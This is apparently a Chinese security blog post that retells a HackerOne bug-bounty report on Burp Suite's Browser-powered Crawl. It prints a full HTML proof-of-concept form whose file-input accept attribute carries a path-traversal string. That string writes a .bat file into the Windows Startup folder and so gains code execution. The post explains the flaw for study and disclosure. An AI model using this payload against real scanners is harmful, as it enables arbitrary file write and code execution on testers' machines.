#  hackerone之5000刀的高危burp漏洞  
原创 pippybear
                    pippybear  安全无界   2026-06-19 12:30  
  
声明：请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。  
  
最近看到hackerone上的一篇赏金报告，还挺有意思的，于是记录一下，这种类似的攻击手法其实还挺多的，包括之前的Mozilla VPN、WinRAR，底层原理都是Path Traversal导致的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/72I8gAalpPUZvwia6zoOLxbFdUYjjiciaoU62mSTGPse4k2jf6zIJr4djUkKjkkm8sGPIEBhxADhtibDJUgGUXv4821VGz3iaAzANZ7NW1M3c1NI/640?wx_fmt=png&from=appmsg "")  
  
5000刀的赏金，嘎嘎眼馋，废话不多说，直接开始正文。整体看了一下，这个基本漏洞利用链路如下:  
> 攻击者控制的网站 → 诱导 Burp Scanner 的 Browser-powered Crawl → Burp在本地创建文件时发生路径穿越 → 任意文件写入 → 最终借助 Windows Startup 机制实现代码执行。  
  
## 漏洞POC：  
```
<!doctype html>
<html>
 <body>
 <form action="/upload" method="post" enctype="multipart/form-data">
 <input
 type="file"
 name="upload"
 value="calc.exe"
 accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
 <button type="submit">Upload</button>
 </form>
 </body>
</html>

```  
## 漏洞核心原理：  
  
Browser-powered Crawl 要自动测试文件上传功能，而浏览器必须选择一个真实存在的本地文件。所以 Burp 需要先在本地生成一个临时文件，再模拟用户选择这个文件上传。这个就是漏洞的大前提，核心原因主要是临时文件名的构造存在问题，如下  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/72I8gAalpPXW8ogwIUVTsdGwKPPlzuGfHuhS5sAOaCsRkBysNgic4ibhJvmjawvaxTibfJy92kJ90nTb6m3OLT0SXqOvmyHWiaPGlUfL227eLq0/640?wx_fmt=png&from=appmsg "")  
  
Burp 的开发者逻辑：  
```
accept=".jpg"
↓
提取扩展名
↓
生成 file.jpg
```  
  
攻击者：  
```
accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat"
```  
  
Burp看到以 . 开头，于是会认为是合法扩展名，但实际上是../../../../...路径穿越，最终实现写入到攻击者指定的目录。偷个懒，直接使用漏洞报告的截图，哈哈～  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/72I8gAalpPWpYicU5hnt4r43997UOQSgQ46BFCj8bn2aXYFNC6ybtjvbho9uicXM3VDa3VNFoDYQ0e4E3XUEaycQNdXKyOAR6MCSrLkl0piasQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/72I8gAalpPXnAwchia3WLJKaJ6DYLhfJoSsVILEkMLYcfYmXHp2fP2cgGG98ATlm0wuSCNeAaZJSVZLHGPLvuI5uKwiaC6J27wvib9mcgqogicY/640?wx_fmt=png&from=appmsg "")  
  
